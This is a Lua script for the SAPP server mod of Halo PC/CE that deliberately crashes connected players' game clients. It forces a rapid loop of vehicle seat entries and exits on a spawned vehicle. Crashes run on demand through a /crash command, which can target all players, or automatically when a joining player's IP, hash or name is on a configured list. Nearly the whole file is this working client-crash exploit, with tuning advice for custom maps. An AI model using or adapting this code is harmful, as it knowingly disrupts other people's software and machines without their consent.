--[[
--=====================================================================================================--
Script Name: Client Crasher, for SAPP (PC & CE)
Description: Causes a client segmentation fault automatically or on-demand.

The auto-crash feature is the primary function of this script:
There is an array in the config section of the script that you can configure
with the names, hashes or IP addresses of the halo clients that you wish to punish.
When a player joins, their hash, IP and name is cross-examined against those lists.
If a match is made, their client will be crashed.

The second feature is a custom command that you can use to crash someone's game client on-demand:
Syntax: /crash [player id | me | */all]
"me" can be used in place of your own player id

Copyright (c) 2020-2021, Jericho Crosby <jericho.crosby227@gmail.com>
* Notice: You can use this document subject to the following conditions:
https://github.com/Chalwk77/Halo-Scripts-Phasor-V2-/blob/master/LICENSE
--=====================================================================================================--
]] --

-- Configuration [start] -----------------------------
api_version = "1.12.0.0"

local Crash = {

    -- This is the custom command used to crash players
    command = "crash",

    -- Minimum permission level needed to crash a player:
    permission = 1,

    -- Should the command executor be able to crash their own game client?
    crash_self = false,

    --
    -- New USERS ARRAY feature (as of 23/02/21) --
    -- I have added a new users array from which you can specify
    -- the ip address, hash or names of anyone you want this script to crash when they join.
    -- Be careful about basing this on hash and ensure that it's not illegitimate.
    users = {
        ip = {
            "120.0.0.1",
            "168.192.1.2",
        },
        hash = {
            "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", -- hash 1
            "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", -- hash 2
            "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", -- hash 3
            "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", -- hash 4
        },
        names = {
            "TᑌᗰᗷᗩᑕᑌᒪOᔕ",
            "A55hol3",
        },
    },
    ------------------------------------------------

    tags = {

        --======================================================================================--
        -- This mod uses a vehicle to crash the client.
        -- If you want this script to work on custom maps that don't have stock tags,
        -- simply enter ONE valid vehicle tag address per custom map in the tags array below.

        -- {tag, loop iterations}
        -- Only change the loop iteration setting if you know what you're doing.
        -- Do not set higher than 2000.
        --======================================================================================--

        -- WARNING: Do not set loop iterations higher than 100 for stock maps.
        -- For custom maps, if you're experiencing a problem where the command executes fine but all it does
        -- is kill the player, try setting the iterations higher.

        { "vehicles\\warthog\\mp_warthog", 20 }, -- this tag is sufficient for all stock maps.
        { "bourrin\\halo reach\\vehicles\\warthog\\rocket warthog", 2000 }, -- this is for bigassv2,104
    }
    --===================================================--
}
-- Configuration [end] -----------------------------

function OnScriptLoad()
    register_callback(cb['EVENT_JOIN'], "OnPlayerConnect")
    register_callback(cb['EVENT_GAME_START'], "OnGameStart")
    register_callback(cb['EVENT_COMMAND'], "OnServerCommand")
    Crash:SetCrashVehicle()
end

function OnScriptUnload()
    -- N/A
end

function OnGameStart()
    Crash:SetCrashVehicle()
end

local gsub = string.gsub
local lower, gmatch = string.lower, string.gmatch
local function CMDSplit(CMD)
    local Args = { }
    CMD = gsub(CMD, '"', "")
    for Params in gmatch(CMD, "([^%s]+)") do
        Args[#Args + 1] = lower(Params)
    end
    return Args
end

function Crash:OnServerCommand(Executor, CMD)
    local Args = CMDSplit(CMD)
    if (Args ~= nil and Args[1] == self.command) then
        local lvl = tonumber(get_var(Executor, "$lvl"))
        if (lvl >= self.permission or Executor == 0) then
            if (Args[2] ~= nil) then
                if (self.vehicle_tag ~= nil) then
                    local pl = self:GetPlayers(Executor, Args)
                    if (pl) then
                        for i = 1, #pl do
                            local TargetID = tonumber(pl[i])
                            if (Executor == TargetID) then
                                if (not self.crash_self) then
                                    self:Respond(Executor, "You cannot execute this command on yourself", 10)
                                end
                            else
                                self:CrashClient(Executor, TargetID)
                            end
                        end
                    end
                else
                    self:Respond(Executor, "==================================================================", 10)
                    self:Respond(Executor, "Command does not work on this map.", 10)
                    self:Respond(Executor, "Please contact Chalwk (github.com/chalwk77/halo-script-projects)", 10)
                    self:Respond(Executor, "==================================================================", 10)
                end
            else
                self:Respond(Executor, "Invalid Syntax. Usage: /" .. self.command .. " [player id | me | */all]", 10)
            end
        else
            self:Respond(Executor, "Insufficient Permission", 10)
        end
        return false
    end
end

function Crash:CrashOnJoin(Ply)

    -- If any of these return true, the player will be crashed.

    local hash = get_var(Ply, "hash")
    local name = get_var(Ply, "$name")
    local ip = get_var(Ply, "$ip"):match("%d+.%d+.%d+.%d+")

    for _, IP in pairs(self.users.ip) do
        if (ip == IP) then
            return true
        end
    end
    for _, HASH in pairs(self.users.hash) do
        if (hash == HASH) then
            return true
        end
    end
    for _, NAME in pairs(self.users.names) do
        if (name == NAME) then
            return true
        end
    end

    return false
end

function DelayCrash(Ply)
    return Crash:CrashClient(0, Ply)
end

function Crash:OnPlayerConnect(Ply)
    if self:CrashOnJoin(Ply) then

        -- Player must be alive in order to crash them.
        -- Delay crash by 1000ms:
        timer(1000, "DelayCrash", Ply)
    end
end

local function GetXYZ(Ply)
    local x, y, z
    local DyN = get_dynamic_player(Ply)
    if (DyN ~= 0) then
        local VehicleID = read_dword(DyN + 0x11C)
        if (VehicleID == 0xFFFFFFFF) then
            x, y, z = read_vector3d(DyN + 0x5c)
        else
            x, y, z = read_vector3d(get_object_memory(VehicleID) + 0x5c)
        end
    end
    return x, y, z
end

function Crash:CrashClient(Executor, TargetID)
    local name = get_var(TargetID, "$name")
    if player_alive(TargetID) then

        local x, y, z = GetXYZ(TargetID)
        local vehicle = spawn_object("vehi", self.vehicle_tag, x, y, z)
        local object = get_object_memory(vehicle)

        if (object ~= 0) then

            --
            -- Initialize a for-loop starting at 0 (first iteration):
            --
            for seat = 0, self.iterations do
                --
                -- Enter player into the seat number of the current loop iteration.
                --
                enter_vehicle(vehicle, TargetID, seat)
                --
                -- Force player out of vehicle.
                --
                exit_vehicle(TargetID)
            end
            --
            -- Approx 50 milliseconds later:
            -- Destroy vehicle after for-loop has finished executing
            --
            destroy_object(vehicle)
            self:Respond(Executor, "Crashed " .. name .. "'s game client", 10)
        else
            self:Respond(Executor, "Something went wrong! Try again.", 10)
        end
    else
        return self:Respond(Executor, name .. " is dead. Please wait until they respawn.")
    end
end

function Crash:Respond(Ply, Message, Color)
    Color = Color or 10
    if (Ply == 0) then
        cprint(Message, Color)
    else
        rprint(Ply, Message)
    end
end

function Crash:GetPlayers(Executor, Args)
    local pl = { }
    if (Args[2] == nil or Args[2] == "me") then
        if (Executor ~= 0) then
            table.insert(pl, Executor)
        else
            self:Respond(Executor, "Please enter a valid player id", 10)
        end
    elseif (Args[2] ~= nil) and (Args[2]:match("^%d+$")) then
        if player_present(Args[2]) then
            table.insert(pl, Args[2])
        else
            self:Respond(Executor, "Player #" .. Args[2] .. " is not online", 10)
        end
    elseif (Args[2] == "all" or Args[2] == "*") then
        for i = 1, 16 do
            if player_present(i) then
                table.insert(pl, i)
            end
        end
        if (#pl == 0) then
            self:Respond(Executor, "There are no players online!", 10)
        end
    else
        self:Respond(Executor, "Invalid Command Syntax. Please try again!", 10)
    end
    return pl
end

local function GetTag(Type, Name)
    local Tag = lookup_tag(Type, Name)
    return Tag ~= 0 and read_dword(Tag + 0xC) or nil
end

function Crash:SetCrashVehicle()
    self.vehicle_tag = nil
    self.iterations = nil
    if (get_var(0, "$gt") ~= "n/a") then
        for _, v in pairs(self.tags) do
            -- The first valid vehicle tag address found will be used:
            if GetTag("vehi", v[1]) then
                self.vehicle_tag = v[1]
                self.iterations = v[2]
                break
            end
        end
    end
end

function OnServerCommand(P, C)
    return Crash:OnServerCommand(P, C)
end
function OnPlayerConnect(P)
    return Crash:OnPlayerConnect(P)
end

return Crash